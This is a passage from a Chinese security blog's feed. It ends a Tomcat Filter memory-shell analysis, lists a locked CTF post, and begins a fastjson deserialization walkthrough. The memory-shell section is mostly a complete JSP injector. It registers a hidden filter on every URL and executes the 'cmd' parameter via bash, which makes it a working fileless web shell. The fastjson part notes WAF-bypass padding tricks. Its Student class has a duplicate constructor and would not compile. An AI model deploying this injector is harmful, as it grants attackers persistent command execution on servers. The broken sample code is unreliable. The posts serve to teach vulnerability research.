src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/13.jpg" alt></p><p>那么该调用过程就分析的差不多了</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>先从context中获取filterMaps</li><li>根据filterMaps从context中取出filterConfig</li><li>将filterConfig加入filterChain中，filterChain中的filters成员变量会添加filterConfig</li><li>调用doFilter</li></ul><h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><p>通过上面的分析，我们知道如果想将木马注册到filter中，那么就需要context对象的两个参数</p><ul><li>filterMaps</li><li>filterConfigs</li></ul><p>在他们两个Map中添加相应的filter就行了</p><p>但是，当我们去看filterConfigs相应的构造函数代码，会发现需要传递 Context和filterDef，且并不带有public，那么就需要通过反射获取<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/14.jpg" alt></p><p>context就是上面分析的那个context<br>所以最后需要三个参数，具体如何生成可以看相应的构造函数</p><ul><li>filterMaps</li><li>filterConfigs</li><li>filterDef</li></ul><p>那么最终的代码如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;abcd&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name)==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filterDef添加到filterDefs中</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li><a href="https://xz.aliyun.com/t/10362">https://xz.aliyun.com/t/10362</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;对Filter内存马原理的简单分析&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="内存马" scheme="http://example.com/categories/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="内存马" scheme="http://example.com/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>buu刷题(1)</title>
    <link href="http://example.com/2022/12/04/buu%E5%88%B7%E9%A2%98-1/"/>
    <id>http://example.com/2022/12/04/buu%E5%88%B7%E9%A2%98-1/</id>
    <published>2022-12-03T22:38:24.000Z</published>
    <updated>2022-12-13T11:32:42.719Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">  <script id="hbeData" type="hbeData" data-hmacdigest="941071248fd19cc97be93fda44a72c67642ab6f36c8a8389ce321e0a098a30f6"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码阅读</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>fastjson初学</title>
    <link href="http://example.com/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/"/>
    <id>http://example.com/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/</id>
    <published>2022-12-01T14:51:27.000Z</published>
    <updated>2022-12-04T20:18:09.166Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>写这篇文章就是来简单理解一下他反序列化的原理，内核实现<br><span id="more"></span><br>在调试fastjson的时候可能会遇到Source code does not match the bytecode的情况（IJ），我的解决方案是下载源码去阅读</p><h2 id="fastjson基本用法"><a href="#fastjson基本用法" class="headerlink" title="fastjson基本用法"></a>fastjson基本用法</h2><p>文章的fastjson版本<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><br>fastjson主要是用来序列化与反序列化JavaBean<br>下面是一个简单的JavaBean对象<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student无参构造器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>下面将用fastjson来序列化上面的对象，将他们转换为json<br>新建一个文件StudentSer.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentSer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">serJson</span> <span class="operator">=</span> JSON.toJSONString(<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;kaikaix&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        System.out.println(serJson);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/1.jpg" alt><br>打印了getAge和getName，说明在序列化的时候会对getXxxx进行调用<br>当然不止toJSONString，还有toJSONBytes，具体可以看JSON.class类中的成员方法</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>接下来就是反序列化了，这里的反序列化类似php，并不是读取字节文件，而是读取json格式的字符串<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentSer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">serJson</span> <span class="operator">=</span> JSON.toJSONString(<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;kaikaix&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        System.out.println(serJson);</span><br><span class="line">        System.out.printf(<span class="string">&quot;Parse had done =&gt; %s\n&quot;</span>,JSON.parse(serJson).getClass());</span><br><span class="line">        System.out.printf(<span class="string">&quot;parseObject has done =&gt; %s\n&quot;</span>,JSON.parseObject(serJson).getClass());</span><br><span class="line">        System.out.printf(<span class="string">&quot;parseObject(Student.class) has done =&gt; %s\n&quot;</span>,JSON.parseObject(serJson,Student.class).getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/2.jpg" alt><br>在这里进行了三次反序列化<br>主要就是parse和parseObject<br>但是观察parseObject的源码，其实也是对parse的一次封装，核心还是调用了parse，主要区别就是对parse后返回的obj调用了一次toJSON，调用toJSON就会调用类中所有get，set方法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> parse(text);</span><br><span class="line">    <span class="keyword">return</span> obj <span class="keyword">instanceof</span> JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们注意到，只有最后一次反序列化的时候调用了setXxx方法，因为最后一次传递了一个Student.class给他，fastjson才能知道这段String最后到底应该反序列化为哪个对象<br>而且反序列化的时候调用的构造函数是无参构造器，所以fastjson反序列化的JavaBean必须有无参构造器，否则就会报错</p><blockquote><p><strong>@type</strong><br>如果每次都需要传递具体是哪个类的，就会显得这个反序列化很笨重，所以开发者给定了一个@type的键，可以在json字符串里面指定具体要反序列化为哪个对象<br><code>serJson = &quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:12,\&quot;name\&quot;:\&quot;Sam\&quot;&#125;&quot;;</code><br>如果是将这样的json字符串进行反序列化，那么上面的三种反序列化方式也都可以正确反序列化<br>所以这个点也是后续漏洞的核心关键</p></blockquote><h2 id="反序列化源码分析"><a href="#反序列化源码分析" class="headerlink" title="反序列化源码分析"></a>反序列化源码分析</h2><p><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/3.jpg" alt></p><h3 id="No1-DefaultJSONParser"><a href="#No1-DefaultJSONParser" class="headerlink" title="No1 DefaultJSONParser"></a>No1 DefaultJSONParser</h3><p>首先会进入这里，new了一个DefaultJSONParser对象<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/4.jpg" alt><br>跟进去会首先判断第一个字符是什么，如果是“{”，就会将token设置为12，如果是“[”，就会设置14，如果都不是就会进入nextToken，主要作用就是看下一个字符是什么，如果碰到了“{”就将token设置为12<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//部分代码</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">    <span class="built_in">this</span>.next();</span><br><span class="line">    <span class="built_in">this</span>.token = <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><br>当然还有其它情况，比如碰到空格之类的，就会继续跳到下一个字符，直到碰到像“{”这样的字符，有时绕waf可能就会用到这些特性，比如在json前面填充垃圾字符<br><code>serJson = &quot;        &#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:12,\&quot;name\&quot;:\&quot;Sam\&quot;&#125;&quot;;</code><br>剩下的读者可以自行分析</p><blockquote><p><strong>小插曲</strong><br>这里我将{}改成了[]，然后进行了反序列化<br><code>serJson = &quot;[\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:12,\&quot;name\&quot;:\&quot;Sam\&quot;]&quot;;</code><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/5.jpg" alt><br>但是报错了，继续fuzz，试了一下{开头，]结尾<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/6.jpg" alt><br>虽然最后报错了，但是前面确实可以反序列化，说不定这种就可以绕一下waf</p></blockquote><p><em>注意上面的操作都是在json字符串之前的，也就是在“{”前面的一些检查，接下来就进入{}里面了</em></p><h3 id="No2-parseObject-gt-skipWhitespace"><a href="#No2-parseObject-gt-skipWhitespace" class="headerlink" title="No2 parseObject()-&gt;skipWhitespace()"></a>No2 parseObject()-&gt;skipWhitespace()</h3><p>走完DefaultJSONParser的初始化，就进入到parser.parse()<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/7.jpg" alt><br>因为之前是{，所以设置的token为12，所以就会进入这个case<br>由于字节的原因，我不能在这下断点，所以我直接将断点打到parseObject里面<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/8.jpg" alt><br>直接跳到这个循环处<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/9.jpg" alt><br>第一个函数根据英文意思skipWhitespace，可以大概猜出是跳过空白字符串<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">skipWhitespace</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.ch &lt;= <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27; &#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\r&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\n&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\t&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\f&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\b&#x27;</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.next();</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.skipComment();</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到具体实现，不仅可以跳过空格，换行之类的，还可以跳过注释（skipComment）<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">skipComment</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.next();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.ch != <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.next();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(<span class="built_in">this</span>.ch != <span class="number">26</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.next();</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.next();</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">this</span>.next();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;invalid comment&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.next();</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="built_in">this</span>.ch != <span class="string">&#x27;\n&#x27;</span>);</span><br><span 